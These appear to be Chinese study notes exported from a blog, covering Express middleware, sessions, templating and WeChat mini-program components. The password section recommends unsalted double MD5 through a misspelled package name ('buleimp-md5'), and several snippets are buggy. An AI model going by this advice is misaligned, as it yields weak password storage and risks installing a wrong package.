命令所属路径影响\n\n\n\n在文件操作核心模块 fs 中 读取文件 里文件路径 \n\nif  ./a.html -> 读取的是 **相对于执行node命令所处的终端路径**\n\n> eg：a.html 在 c:/in/out/side/a.html  \n>\n> 在这个路径下还有一个index.js -> c:/in/out/side/index.js 有一个读文件的操作 fs.readfile('./a.html')\n>\n> 在终端这样运行 **c:/in/out/side**> node  **index.js** 时是不会报错的  此时读的a.html地址 **c:/in/out/side/html**\n>\n> 但这样运行 **c:/in/out**> node  **side/index.js** 时 读的a.html的地址就是 **c:/in/out/index/js**\n>\n> 所以在文件操作中，使用相对路径不可靠 ==>> 所以要使用动态的绝对路径\n>\n> 为了避免在使用的过程中出现路径拼接操作 使用 path.join()\n\n所以推荐在**文件模块操作**中使用的相对路径统一转换为 **动态的绝对路径**\n\n—> fs.readFile(path.join(__dirname , './a.txt') , 'utf8' , function(err,data){ … })\n\n​      app.use('/public/', express.static('./public/'));   \n\n—> app.use('/public/', express.static(path.join(__dirname , './public/')));\n\n—> app.set('views' , path.join(__dirname , './views/'))  //默认就是 ./views 目录\n\n—> \n\n(模块中的路径标识不受node命令所处的路径影响)\n\n\n\n### 7.3 art-template 中的 include extend block 语法\n\n> 在node 中还有很多第三方模板引擎可以使用 ejs   jade(pug)   nunjucks  ` <%%>` `{{ }}`\n\n子模版 模板继承\n\n1. `{{ include  '文件路径' }}`    将 文件路径的 文件导入该 html \n2. `{{ extend  '文件路径' }}`   继承 文件路径 中的模板 \n3. `{{ block  'name' }}   {{ /block}}`  在模板中 留坑；在继承模板的html中填坑\n\n\n\n也可以用 if else 选择要显示的dom\n\n`{{  if 条件 }}`\n\n`{{  else  }}`\n\n`{{  /if  }}`\n\n\n\n### 7.4 ajax 接受数据为 json 类型\n\n1. 封装ajax  eg: 注册页面 post请求\n\n   ~~~js\n   $.ajax({\n       url:'/register',\n       type:'post',\n       data:formData,\n       dataType:'json',\n       success:function(data){\n           if(err_code === 0){\n               log(\"成功\")\n           }else if(err_code === 1){\n               log(\"邮箱或者密码已存在\")\n           }else if(err_code === 500){\n               log(\"错误\")\n           }\n       }\n   })\n   ~~~\n\n2. 数据响应时 也要用json格式  给每一个状态设置一个状态码 好用于上面success 进行处理\n\n   ~~~js\n   ...\n   if(err){\n      return res.status(500).json({\n          err_code:500,\n          message:'服务器错误'\n      }) \n   }\n   if(data){\n       return res.status(200).json({\n           err_code:1,\n           message:'邮箱或者密码已存在'\n       })\n   }\n   res.status(200).json({\n       err_code:0,\n       message:'ok'\n   })\n   ...\n   ~~~\n\n\n\n### 7.5 密码加密 buleimp-md5\n\n1. 下载 ：`npm i buleimp-md5`\n\n2. 引包：`const md5 = require('buleimp-md5')`\n\n3. 使用   给密码 进行md5 重复加密 ：`body.password = md5(md5(body.password))`\n\n   > 在准备创建用户前进行密码加密\n   >\n   > 下一步\n   >\n   > new User(body).save()\n\n\n\n加密后 if 要 登录 验证账号密码 要\n\n~~~js\nUser.findOne({\n    email:body.email,\n    password:md5(md5(body.password))\n},function(){})\n~~~\n\n\n\n\n\n### 7.6 表单提交行为\n\n表单默认提交行为：同步 ==> 同步表单提交，浏览器会锁死(转圈)等待服务器响应结果\n\n表单同步提交后，无论服务器端响应什么，都会直接将响应结果覆盖掉当前页面\n\n===> **服务器重定向**\n\n\n\n#### 7.6.1 服务器重定向对异步请求无效\n\n所以上面的代码中在 这里成功的时候要 重定向\n\n~~~js\n$.ajax({\n    url:'/register',\n    type:'post',\n    data:formData,\n    dataType:'json',\n    success:function(data){\n        if(err_code === 0){\n            window.location.href = '/'   //!!!!!!\n            //log(\"成功\")\n        }else if(err_code === 1){\n            log(\"邮箱或者密码已存在\")\n        }else if(err_code === 500){\n            log(\"错误\")\n        }\n    }\n})\n\n//在服务器这样是无效的\nres.status(200).json({\n    err_code:0,\n    message:'ok'\n})\n\nres.redirect('/')   //无效\n~~~\n\n\n\n### 7.7 第三方中间件 express-session\n\ncookie 用来保存一些不太敏感的数据  不能用来保存登陆状态\n\nsession 比较安全 \n\n登陆状态 会有一个凭证  这个凭证是服务器给的 不容易伪造\n\n\n\n在Express中 默认不支持 Session 和 Cookie\n\n#### 7.7.1 express-session\n\n1. 安装：`npm i  express-session`\n\n2. 引用：`const session = require('express-session')`\n\n3. 配置：(一定要在 app.use(router)之前)\n\n   ~~~js\n   // 会为 req 请求对象添加一个成员 req.session\n   app.use(session({\n       secret:'keyboard',   \n       //配合字符串 会在原有加密基础之上 加上这个字符拼起来 去加密 \n       //== body.password = md5(md5(body.password) + 'keyboard')\n       resave:false,\n       saveUninitialized:true\n   }))\n   ~~~\n\n4. 使用：添加session数据  —>  req.session.foo = 'bar'\n\n   ​           获取session数据 —>  req.session.foo\n\n> 默认 session 数据是内存存储的 服务器一旦重启 就会丢失 真正的生产环境会把 session 进行持久化 存储\n\n\n\n#### 7.7.2 浏览器插件editthiscookie\n\n可以看cookie 和 ssession 的字段值\n\n\n\n## 8. 中间件\n\n在Express中\n\n当请求进来，会从第一个中间件进行匹配 **:** if 匹配  —> 请求进入中间件 \n\n​                                                                                 if 调用了next  —> 进入下一个匹配的中间件\n\n​                                                                                 if 没调用  —>   直接结束\n\n​                                                               if 不匹配 —> 一直往后走到匹配/结束为止\n\n### 8.1 应用程序级别中间件\n\n1. 万能匹配(不关心任何请求路径和请求方法)：\n\n   ~~~js\n   app.use(function(req,res,next){\n       log(...)\n       next()\n   })\n   ~~~\n\n2. 以某路径 /xxx/ 开头\n\n   ~~~js\n   app.use('/a',function(req,res,next){\n       log(...)\n       next()\n   })\n   ~~~\n\n\n\n### 8.2 路由级别中间件\n\n1. get\n\n   ~~~js\n   app.get('/',function(req,res,next){\n       res.send(...)\n   })\n   ~~~\n\n2. post\n\n   ~~~js\n   app.post('/',function(req,res,next){\n       res.send(...)\n   })\n   ~~~\n\n3. …\n\n\n\n### 8.3 错误处理中间件\n\n~~~js\napp.use(function(err,req,res,next){\n    console.error(...)\n    res.status(500).send(...)\n})\n~~~\n\n\n\n#### 8.3.1 配置处理一个 404 的中间件\n\n在app.use(router) 挂载路由后\n\n~~~js\n//在app.use(router) 挂载路由后\napp.use(function(req,res){\n    res.render('404.html')\n})\n~~~\n\n\n\n#### 8.3.2 配置一个处理全局错误处理中间件\n\n在处理404页面后\n\n~~~js\n//在处理404页面后\napp.use(function(err,req,res,next){\n    res.status(500).json({\n        err_code:500,\n        message:err.message\n    })\n})\n~~~\n\n\n\n在其他的请求处理中应该再加一个参数 ，以及在有错误时要这样处理 next(err)\n\n> 这样就会往后查找 带有四个参数的应用程序级别中间件中\n\n~~~js\napp.get('/',function(req,res,next){\n    fs.readFile('./a.txt',function(err,data){\n        if(err){\n            next(err)\n        }\n       ...\n    })\n})\n~~~\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["Nodejs"],"categories":["learningNotes"]},{"title":"微信小程序","url":"/learningNotes/微信小程序","content":"\n## 1.软件介绍\n\n### 1.1 下载\n\n[官网](https://mp.weixin.qq.com/cgi-bin/wx)\n\n注册 –> 登录 -> 注册appID -> [下载](https://developers.weixin.qq.com/miniprogram/dev/devtools/download.html)微信开发者工具 -> 安装 -> 创建项目\n\n[介绍](https://developers.weixin.qq.com/miniprogram/dev/devtools/devtools.html)开发者工具的工具栏\n\n### 1.2 配置文件介绍\n\n#### 1.2.1 app.json 全局配置\n\n+ page : 用于指定小程序由哪些页面组成，每一项都对应一个页面的 路径（含文件名） 信息。文件名不需要写文件后缀，框架会自动去寻找对应位置的 `.json`, `.js`, `.wxml`, `.wxss` 四个文件进行处理。\n\n  未指定 `entryPagePath` 时，数组的第一项代表小程序的初始页面（首页）。\n\n  **小程序中新增/减少页面，都需要对 pages 数组进行修改。**\n\n+ window : 用于设置小程序的状态栏、导航条、标题、窗口背景色。\n\n+ tabBar : 通过 tabBar 配置项指定 tab 栏的表现，以及 tab 切换时显示的对应页面。\n\n~~~js\n{\n \"page\":[\n     \"pages/index/index\",\n     \"pages/log/log\"\n ],\n \"window\": {\n    \"navigationBarBackgroundColor\": \"#ffffff\",\n    \"navigationBarTextStyle\": \"black\",\n    \"navigationBarTitleText\": \"微信接口功能演示\",\n    \"backgroundColor\": \"#eeeeee\",             //下拉加载的位置\n    \"backgroundTextStyle\": \"light\"            //下拉加载的logo\n  }\n}\n~~~\n\n\n\n#### 1.2.2 index.json 页面配置\n\n每一个小程序页面也可以使用 `.json` 文件来对本页面的窗口表现进行配置。页面中配置项在当前页面会覆盖 `app.json` 的 `window` 中相同的配置项。\n\n~~~js\n{\n  \"usingComponents\": {},\n    //app.json 的 window 配置一样\n    \"navigationBarBackgroundColor\": \"#ffffff\",\n    \"navigationBarTextStyle\": \"black\",\n    \"navigationBarTitleText\": \"微信接口功能演示\",\n    \"backgroundColor\": \"#eeeeee\",             //下拉加载的位置\n    \"backgroundTextStyle\": \"light\"            //下拉加载的logo\n}\n~~~\n\n> 可以手动关闭下拉刷新窗口  if 没用调用 也不会报错\n>\n>index.js\n>\n>wx.stopPullDownRefresh();\n\n\n\n#### 1.2.3 sitemap.json 配置\n\n用于配置小程序及其页面是否允许被微信索引，文件内容为一个 JSON 对象，如果没有 `sitemap.json` ，则默认为所有页面都允许被索引；\n\n\n\n## 2.模板语法\n\n### 2.0 wxml 标签\n\n> vscode使用“微信小程序开发”插件\n\n1. `<text> == <span> ` \n2. `<view> == <div>`\n3. `<checkbox> 复选框`\n\n\n\n### 2.1 数据绑定\n\n~~~js\n//demo01.js\n\nPage({\n    //页面的初始数据\n    data:{\n        msg:'hello mina',\n        isChecked:false\n    }\n})\n~~~\n\n~~~html\n<!-- demo01.wxml -->\n\n<!-- 1.在文本中使用 -->\n<view> {{ msg }} </view>\n\n<!-- 2.在属性中使用 -->\n<view data-msg=\"{{ msg }}\">自定义属性</view>\n\n<!-- 3.使用bool充当属性时 “ 和 { 之间不要留空格 否则会导致识别失败 -->\n<checkbox checked=\"{{isCheck}}\"></checkbox>\n~~~\n\n\n\n### 2.2 运算\n\n运算 => 表达式\n\n可以在 `{{ }}` 中加入表达式\n\n> 表达式 => 简单 运算 数字运算 拼接 逻辑运算\n>\n> ​               数字加减 字符串拼接 三元表达式\n>\n> 语句 => 复杂代码段 \n>\n> ​           if else   switch   do while   for\n\n\n\n~~~html\n<view>{{ 1+1 }}</view>       2\n<view>{{ '1'+'1' }}</view>   11\n<view>{{ 10%2===1 ? '奇数' : '偶数' }}</view> 偶数\n~~~\n\n\n\n### 2.3 列表渲染\n\n#### 2.3.1 列表循环\n\n1. wx:for=“{{ 数组或者对象 }}” \n\n   wx:for-item=“循环项name”  \n\n   wx:for-index=“循环项索引”\n\n2. wx:key=“唯一的值”  -> 为了提高列表性能 \n\n   wx:key=“*this”        -> 表示你的数组是一个普通数组[]  *this表示循环项\n\n3. 出现循环嵌套 以下绑定名称 不能重名\n\n   wx:for-item=\"item\" wx:for-index=\"index\"\n\n4. 默认情况下（一层循环）不用写 \n\n   wx:for-item=\"item\" wx:for-index=\"index\"\n\n#### 2.3.2 对象循环\n\n1. wx:for=“`{{` 数组或者对象 `}}`” \n\n   wx:for-item=“对象的值”  \n\n   wx:for-index=“对象的键”\n\n2. 最好把 item index 的名称 修改下 item,index => value,key\n\n3. wx:key=“对象的任何一个属性”\n\n~~~js\n//demo01.js\nPage({\n data: {\n     ...\n    person: {\n      id: 123,\n      name: '富婆',\n      height: '166',\n    },\n    list: [\n      { id: 0, name: 'zero' },\n      { id: 1, name: 'one' },\n      { id: 2, name: 'two' }\n    ]\n\n  },\n})\n\n~~~\n\n~~~html\n  ----列表循环 wx:for-------\n  \n<view wx:for=\"{{list}}\" wx:for-item=\"item\" wx:for-index=\"index\" wx:key=\"id\">\n  索引:{{index}}\n  ----\n  值:{{item.name}}\n</view>\n\n  ----对象循环 wx:for-------\n\n<view wx:for=\"{{person}}\" wx:for-item=\"value\" wx:for-index=\"key\" wx:key=\"id\">\n  属性:{{key}}\n  ----\n  值:{{value}}\n</view>\n~~~\n\n\n\n#### 2.3.3 block 标签\n\n相当于一个占位符\n\n写代码的时候 会有 \n\n页面运行后 这个标签直接不存在\n\n~~~html\n<block wx:for=\"{{person}}\" wx:for-item=\"value\" wx:for-index=\"key\" wx:key=\"id\">\n  属性:{{key}}\n  ----\n  值:{{value}}\n</view>\n\n==>\n\n属性:id ---- 值:123 属性:name ---- 值:富婆 属性:height ---- 值:166\n~~~\n\n\n\n### 2.4 条件渲染\n\n1. wx:if=“`{{`true/false`}}`”    <font color='red'>使用添加删除元素</font>\n\n2. 三选一\n\n   wx:if=“`{{}}`”\n\n   wx:elif=“`{{}}`”\n\n   wx:else \n\n3. hidden     <font color='red'>使用display:none</font>\n\n   在标签直接加入\n\n   hidden=“`{{`true`}}`”\n\n> if 不是频繁切换显示 使用 wx:if    使用添加删除元素\n>\n> if 频繁切换 使用hidden                使用display:none       所以使用hidden 不要用 display属性\n\n~~~html\n <view>\n  <view>条件渲染</view>\n  <view wx:if=\"{{true}}\">if -> true</view>\n  \n  <view wx:if=\"{{false}}\">if</view>\n  <view wx:elif=\"{{true}}\">elif</view>\n  <view wx:else>else</view>\n   \n   <view hidden>hidden1</view>\n   <view hidden=\"{{true}}\">hidden -> true</view>\n   <view hidden=\"{{false}}\">hidden -> false</view>\n</view>\n~~~\n\n\n\n## 3.事件绑定\n\n### 3.1 input双向绑定\n\n1. 给input标签绑定input事件 绑定关键子 bindinput\n2. 通过事件源e 获取输入框的值 e.detail.value\n3. 使用 this.setData({ num:e.detail.value }) 绑定数据的值\n\n### 3.2 button 点击事件\n\n1. 点击事件 绑定关键字 bindtap\n2. 不能在事件中 (1) 传参  要使用data-自定义属性传 \n3. 使用事件源e 中获取dataset中的值 获取参数\n\n~~~html\n<input type=\"text\" bindinput=\"handleInput\" />\n<button bindtap=\"handletap\" data-num=\"{{1}}\" >+</button>\n<button bindtap=\"handletap\" data-num=\"{{-1}}\" >-</button>\n<view>\n  {{num}}\n</view>\n~~~\n\n~~~js\nPage({\n  data: {\n    num: 0\n  },\n  //输入框input事件的执行逻辑\n  handleInput(e) {\n    this.setData({\n      num: e.detail.value\n    })\n  },\n  //加减按钮的事件\n  handletap(e) {\n    this.setData({\n      num: this.data.num + e.currentTarget.dataset.num\n    })\n  },\n})\n~~~\n\n\n\n## 4. wxss样式\n\n### 4.1 尺寸单位\n\nrpx（responsive pixel）: 可以根据屏幕宽度进行自适应。规定屏幕宽为750rpx。\n\n> if 在 iPhone6 上，屏幕宽度为375px，共有750个物理像素，则750rpx = 375px = 750物理像素，1rpx = 0.5px = 1物理像素。\n\n> if 存在这样一个需求 设计稿 page 宽 ， 存在一个元素 100px 宽  要求页面适配\n>\n> page px = 750rpx  =>  1px = 750rpx / page px  => 100px = 750rpx * 100 / page\n\n在wxss里写的时候 可以 使用calc\n\n+ 可以使用 + - * / ，% px em rem \n+ 可以混合使用各种单位\n+ 用 + - 时 其前后必有空格，* / 可无 但建议保留\n+ 数字与单位之间不留空格\n\n\n\n### 4.2 样式导入\n\n使用`@import`语句可以导入外联样式表，`@import`后跟需要导入的外联样式表的**相对路径**，用`;`表示语句结束。\n\n~~~css\n@import \"..wxss\" \n~~~\n\n\n\n### 4.3 选择器\n\n除了不支持 * 全局选择 ，其他都与 css 一样\n\n\n\n### 4.4 使用less\n\n1. 下载插件 easy less\n\n2. 在vs code 的设置中加入如下配置\n\n~~~js\n\"less.compile\":{\n    \"outExt\":\".wxss\"\n}\n~~~\n\n3. 在编写样式的地方，建立.less文件 正常编辑即可\n\n\n\n## 5. 常见组件\n\n常用的布局组件\n\nview，text，rich-text，button，image，navigator，icon，swiper，radio，checkbox，等\n\n\n\n### 5.1 view \n\n[官方](https://developers.weixin.qq.com/miniprogram/dev/component/view.html)属性 \n\n| 属性                   | 类型    | 默认值 | 必填 | 说明                                                         | 最低版本                                                     |\n| :--------------------- | :------ | :----- | :--- | :----------------------------------------------------------- | :----------------------------------------------------------- |\n| hover-class            | string  | none   | 否   | 指定按下去的样式类。当 `hover-class=\"none\"` 时，没有点击态效果 | [1.0.0](https://developers.weixin.qq.com/miniprogram/dev/framework/compatibility.html) |\n| hover-stop-propagation | boolean | false  | 否   | 指定是否阻止本节点的祖先节点出现点击态                       | [1.5.0](https://developers.weixin.qq.com/miniprogram/dev/framework/compatibility.html) |\n| hover-start-time       | number  | 50     | 否   | 按住后多久出现点击态，单位毫秒                               | [1.0.0](https://developers.weixin.qq.com/miniprogram/dev/framework/compatibility.html) |\n| hover-stay-time        | number  | 400    | 否   | 手指松开后点击态保留时间，单位毫秒                           | [1.0.0](https://developers.weixin.qq.com/miniprogram/dev/framework/compatibility.html) |\n\n\n\n### 5.2 text \n\n+ 文本标签\n+ 只能嵌套text\n+ 只有这个标签 可以长按文字复制   selectable\n+ 可以对空格 回车 进行编码            decode      (if没有的话 像`&nbsp;`这种符号会原样显示)\n\n> decode可以解析的有`&nbsp; &gt; &amp; &apos; &ensp; &emsp;`\n\n\n\n### 5.3 image\n\n+ 因为后期打包上线 不能超过2兆\n\n​       所以会把很多 静态资源放在网络上 [软件：图床 将本地图片 放到网络上]\n\n+ image组件默认宽度320px、高度240px\n+ 可以直接设置懒加载\n\n属性：\n\n| 属性      | 类型    | 默认值      | 必填 | 说明                                                   | 最低版本                                                     |\n| :-------- | :------ | :---------- | :--- | :----------------------------------------------------- | :----------------------------------------------------------- |\n| src       | string  |             | 否   | 图片资源地址                                           | [1.0.0](https://developers.weixin.qq.com/miniprogram/dev/framework/compatibility.html) |\n| mode      | string  | scaleToFill | 否   | 图片裁剪、缩放的模式                                   | [1.0.0](https://developers.weixin.qq.com/miniprogram/dev/framework/compatibility.html) |\n| lazy-load       | boolean        | false                  | 否        | 图片懒加载，在即将进入一定范围（上下三屏）时才开始加载 | [1.5.0 ](https://developers.weixin.qq.com/miniprogram/dev/framework/compatibility.html) |\n\nmode属性的值：\n\n+ scaleToFill ： 默认，不保持宽高比，使图片的宽高完全拉伸至填满 \n+ aspectFit ：常用，保持宽高比，使图片的长边能完全显示出来\n+ aspectFill ：少用，保持宽高比，使图片的短边能完全显示出来\n+ widthFix ：常用，保持宽高比，宽度不变，高度自动变化\n+ heightFix ： 保持宽高比，高度不变，宽度自动变化\n+ top、bottom、center、left、right、top left、top right、bottom left、bottom right ： 不缩放图片，只显示图片的..区域（相当于background-position）\n\n\n\n### 5.4 swiper 轮播图\n\n+ swiper(轮播图外层容器) > swiper-item (轮播项)\n+ swiper存在默认宽(100%)高(150px)  如果里面要用到image也是有默认宽高的(320px * 240px) swiper不会被里面撑开\n+ 要计算swiper 和 image 的宽高\n+ 属性：\n  + autoplay 自动播放\n  + interval 轮播时间 ms\n  + circular 循环轮播\n  + indicator-dots 显示 指示器/分页器/索引器\n  + indicator-color 指示器未选中颜色\n  + indicator-active-color 指示器选中颜色\n\n~~~html\n<!-- 先找出 原图的宽高 等比例 给swiper 定宽高\n原图 520 * 280px \nswiper 宽 / 高 = 原图 宽 / 高\nheight: swiper 宽 * 原图 高 / 宽 = 100vw * 280px / 520px -->\n<swiper autoplay interval=\"2000\" circular indicator-dots>\n\t<swiper-item> <image mode=\"widthFix\" src=\"...\" /></swiper-item>\n\t<swiper-item> <image mode=\"widthFix\" src=\"...\" /></swiper-item>\n\t<swiper-item> <image mode=\"widthFix\" src=\"...\" /></swiper-item>\n</swiper>\n~~~\n\n~~~css\nswiper{\n  width: 100%;\n  height: calc(100vw * 280 / 520);\n}\n\nimage{\n  width: 100%;\n}\n~~~\n\n\n\n\n\n### 5.5 navigator 超链接\n\n导航组件 navigator  块级标签\n\n属性：\n\n+ url：当前小程序内的跳转链接\n+ targer：在哪个目标上发生跳转，默认当前小程序 self(自己 默认) / miniProgram(其他小程序)\n+ open-type：跳转方式\n  + navigate：默认，保留当前页面，跳转应用内某页面，不能跳转tabbar页面\n  + redirect：关闭当前页面，跳转应用内某页面，不能跳转tabbar页面\n  + switchTab：跳转tabBar页面，并关闭其他所有页面\n  + reLaunch：关闭所有页面，打开到应用内某页面\n  + navigateBack：关闭当前页面，返回上一页面，可通过getCurrentPages()获取当前页面栈\n  + exit：退出小程序，target=”miniProgram”时使用\n\n\n\n### 5.6 rich-text [富文本](https://developers.weixin.qq.com/miniprogram/dev/component/rich-text.html)\n\n相当于v-html\n\n~~~html\n<rich-text nodes=\"{{html}}\"></rich-text>\n~~~\n\n~~~js\nPage({\n    data:{\n        //1. 字符串 <div>hello</div>\n        html:\"\"\n        //2. 对象形式\n    }\n})\n~~~\n\n\n\n### 5.7 button \n\n#### 5.7.1 外观属性\n\n[官网](https://developers.weixin.qq.com/miniprogram/dev/component/button.html)\n\n+ size 尺寸：default(默认) / mini(小尺寸)\n\n+ type 颜色：default(灰色) / primary(绿色) / warn(红色)\n+ plain 背景透明\n+ loading 文字前面 + 加载logo\n+ open-type 开发功能 ：…\n\n#### 5.7.2 开放功能\n\n+ open-type 的值：\n  + contact 打开客服对话  需要在微信小程序的后台配置\n    1. 只能真机调试\n    2. 将小程序的appid 由测试号 改为自己的 appid\n    3. 登录 微信小程序官网 添加 客服-微信\n    4. \n  + share 转发当前小程序到微信朋友  不能发到朋友圈\n  + getPhoneNumber 获取当前用户手机号码信息 结合事件  if非企业小程序 就没有权限获取\n    1. 绑定事件 bindgetpphonenumber\n    2. 在回调函数中 通过参数来获取信息 / 事件源e\n    3. 获取的信息加密了 \n    4. 需要用户自己搭建小程序后台服务器 在其解析 返回到小程序才能看到\n  + getUserInfo 获取当前用户的个人信息\n    1. 绑定事件 bindgetuserinfo\n    2. 可以获取到\n  + launchApp 在当前小程序 直接打开app\n    1. 需要先在app 中 通过app 打开小程序\n    2. 然后在小程序中 点击这个button 才能打开 app\n  + openSetting 打开小程序内置的 授权页面\n    1. 只会出现用户曾经授权过的\n  + feedback 打开小程序内置的 意见反馈页面\n    1. 只能真机调试\n\n\n\n### 5.8 icon \n\n属性:\n\n+ type：图标类型 success, success_no_circle, info, warn, waiting, cancel, download, search, clear\n+ size：默认23 ，数值越大 图标越大\n+ color：与css颜色同\n\n\n\n### 5.9 radio\n\nradio-group > radio\n\n可以使用color属性 换颜色\n\n选择单选框 触发的事件 bindchange \n\n需求：选择 在页面中显示选择的内容\n\n~~~html\n<radio-group bindchange=\"handleChange\">\n\t<radio value=\"male\">男</radio>\n    <radio value=\"female\">女</radio>\n</radio-group>\n\n<view>您选择的是：{{gender}} </view>\n~~~\n\n~~~js\nPage({\n    data:{\n        gender:\"\"\n    },\n    handleChange(e){\n        let gender = e.detail.value;\n        this.setData({\n            gender\n        })\n    }\n})\n~~~\n\n\n\n### 5.10 checkbox\n\ncheckbok-group > checkbox\n\n可以使用color属性 换颜色\n\n~~~html\n<checkbox-group bindchange=\"handleChange\">\n\t<checkbox value=\"{{item.value}}\" wx:for=\"{{list}}\" wx:key=\"id\">{{item.name}}</checkbox>\n</checkbox-group>\n\n<view>您选择的是：{{checkedlist}} </view>\n~~~\n\n~~~js\nPage({\n    data:{\n        list:[\n            {id:'1',name:'apple',value:'apple'},\n            {id:'2',name:'pear',value:'pear'},\n            {id:'3',name:'grape',value:'grape'},\n        ],\n        checkedlist:[]\n    },\n    handleChange(e){\n        const checkedlist = e.detail.value;\n        this.setData({\n            checkedlist\n        })\n    }\n})\n~~~\n\n\n\n### 5.11 scroll-view 滚动视图区域\n\n属性：\n\n> 使用竖向滚动时，需要给[scroll-view](https://developers.weixin.qq.com/miniprogram/dev/component/scroll-view.html)一个固定高度，通过 WXSS 设置 height。组件属性的长度单位默认为px，[2.4.0](https://developers.weixin.qq.com/miniprogram/dev/framework/compatibility.html)起支持传入单位(rpx/px)。\n>\n> less 使用 calc 希望css 原样使用  height:~’calc(100vh - 90rpx)’\n\n+ scroll-x：允许横向滚动\n+ scroll-y：允许纵向滚动\n+ scroll-top：设置竖向滚动条位置 \n+ scroll-left：设置横向滚动条位置\n\n\n\n> 点击 其他标签 使本来轮动到一定距离的页面 在顶部显示\n\n~~~html\n<scroll-view scroll-top=\"{{scrollTop}}\" bindTap=\"handleChange\">\n~~~\n\n~~~js\ndata(){\n    scrollTop:0\n},\nhandleChange(){\n    setData({\n        //重新设置 右侧内容的scroll-view标签的距离顶部的距离\n        this.scrollTop:0\n    })\n}\n~~~\n\n\n\n\n\n## 6.自定义组件\n\n### 6.1 使用自定义组件\n\n1. 新增组件\n\n   <img src=\"https://s1.328888.xyz/2022/04/09/XaM80.jpg\"  style=\"zoom:80%; float:left \" >\n\n2. 定义组件  在组件的 json 文件中进行自定义组件声明\n\n   ~~~json\n   //在组件Tabs.json\n   {\n       \"component\":true\n   }\n   ~~~\n\n3. 声明组件 在要使用组件的 json 文件中声明组件\n\n   ~~~json\n   //demo.json\n   {\n     \"usingComponents\": {\n       \"Tabs\":\"../../components/Tabs/Tabs\"        //组件名称:相对路径\n     }\n   }\n   ~~~\n\n4. 使用组件 在要使用的页面 使用\n\n   ~~~html\n   <!-- demo.wxml -->\n   <Tabs></Tabs>\n   ~~~\n\n\n\n\n### 6.2 注意事项\n\n在页面 .js 文件中 事件回调函数 放在 与data 同层级\n\n在组件 .js 文件中 事件回调函数 放在 与data 同层级 的 methods：{} 中\n\n\n\n### 6.3 父向子组件传值 - 通过属性传递\n\n1. 在父组件wxml里 给子`<tabs>`组件 定义属性 \n2. 在子组件js里 的 properties 接收值  属性名aaa : { type:数据类型,value:”” }\n3. 就可以直接在子组件wxml里使用了\n\n~~~html\n//com.wxml\n<Tabs aaa=\"bbb\"></Tabs>\n~~~\n\n~~~js\n//tabs.js\nComponent({\n  //组件的属性列表\n  properties: {\n    aaa: {\n      type: String,\n      value: \"\"\n    }\n  }\n })\n~~~\n\n~~~html\n//tabs.wxml\n <view>{{aaa}}</view>\n~~~\n\n\n\n###  6.4 子向父组件传值 - 通过事件传递\n\n1. 子组件 点击事件 bindtap = ‘handleitemchange’ 触发 handleitemchange 事件\n\n   通过 this.triggerEvent( ‘父组件自定义事件名称 itemChange’ , 要传递的参数) 触发 父组件 的 binditemChange 事件 传递给父组件信息\n\n2. 父组件 自定义事件 binditemChange = ‘handleItemChange’ 被触发 自身处理事件\n\n   通过 handleItemChange(){} 函数 接受 参数 处理事件\n\n\n\n> 代码中 如果 只是 父向 子组件 传 tabs ， 其他业务逻辑在子组件编写 也是会有效果的\n>\n> 但是 是因为 在子组件 接收到 tabs 后 处理 逻辑时 setData 后 把tabs 放在了子组件 的data里 \n>\n> 父组件的值并没有改到\n\n\n\n~~~html\n//父组件.wxml\n<Tabs aaa=\"bbb\" tabs=\"{{tabs}}\" binditemChange=\"handleItemChange\"></Tabs>\n\n//子组件.wxml\n<view ... bindtap=\"itemchange\" >{{item.value}}</view>\n~~~\n\n~~~js\n//子组件.js\nComponent({\n  properties: {\n    tabs: {\n      type: Array,\n      value: []\n    }\n\n  },\n  data: {},\n  methods: {\n    // 父子组件之间的通信\n    itemchange(e) {   //子组件 bindtap 触发的名字\n      const { index } = e.currentTarget.dataset;\n      this.triggerEvent('itemChange', { index }); //父组件自定义事件名 bind + '...'\n    }\n  }\n})\n~~~\n\n~~~js\n//父组件.js\nPage({\n  data: {\n    tabs: [\n      { id: 1, value: \"首页\", isActive: true },\n      { id: 2, value: \"新闻\", isActive: false },\n      { id: 3, value: \"同城\", isActive: false },\n      { id: 4, value: \"我的\", isActive: false }\n    ]\n  },\n  handleItemChange(e) {  //父组件自定义事件值 \n    // 接受传递过来的参数\n    const { index } = e.detail;\n    let { tabs } = this.data;\n    tabs.forEach((v, i) => i === index ? v.isActive = true : v.isActive = false)\n    this.setData({  //修改数据\n      tabs\n    })\n  },\n})\n~~~\n\n\n\n### 6.5 slot 插槽\n\n其实就是一个占位符 直接写在组件标签里面，这些里面的东西就会替换slot\n\n~~~html\n//父组件\n<Tabs>\n  <view>\n    111\n  </view>\n</Tabs>\n\n//子组件\n<view class=\"tabs\">\n <slot></slot> \n</view>\n~~~\n\n\n\n### 6.6 组件的其他属性\n\n​\tComponent 里面的[属性](https://developers.weixin.qq.com/miniprogram/dev/reference/api/Component.html)\n\n| 定义段     | 类型       | 是否必填 | 描述                                                         |      |\n| :--------- | :--------- | :------- | :----------------------------------------------------------- | :--- |\n| properties | Object Map | 否       | 组件的对外属性，是属性名到属性设置的映射表                   |      |\n| data       | Object     | 否       | 组件的内部数据，和 `properties` 一同用于组件的模板渲染       |      |\n| observers  | Object     | 否       | as vue watch — 组件数据字段监听器，用于监听 properties 和 data 的变化，参见 [数据监听器](https://developers.weixin.qq.com/miniprogram/dev/framework/custom-component/observer.html) |      |\n| methods    | Object     | 否       | 组件的方法，包括事件响应函数和任意的自定义方法，关于事件响应函数的使用，参见 [组件间通信与事件](https://developers.weixin.qq.com/miniprogram/dev/framework/custom-component/events.html) |      |\n|            |            |          |                                                              |      |\n| created    | Function   | 否       | as vue created — 组件生命周期函数-在组件实例刚刚被创建时执行，注意此时不能调用 `setData` ) |      |\n| attached   | Function   | 否       | as vue mounting — 组件生命周期函数-在组件实例进入页面节点树时执行) |      |\n| ready      | Function   | 否       | as vue mounted  — 组件生命周期函数-在组件布局完成后执行)     |      |\n| moved      | Function   | 否       | as vue updated  — 组件生命周期函数-在组件实例被移动到节点树另一个位置时执行) |      |\n| detached   | Function   | 否       | as vue destoryed  — 组件生命周期函数-在组件实例被从页面节点树移除时执行) |      |\n\n\n\n## 7. 生命周期\n\n#### 7.1 应用 app.js 生命周期 \n\n+ 全局最外层是App({})\n\n+ onLaunch() : 触发：应用第一次启动时;\n\n  ​                    作用：应用第一次启动时，获取用户个人信息\n\n+ onShow() : 触发：应用被用户看到时\n\n  ​                  作用：对应用的数据或页面效果 重置\n\n+ onHide() : 触发：应用被隐藏时\n\n  ​                作用：暂定 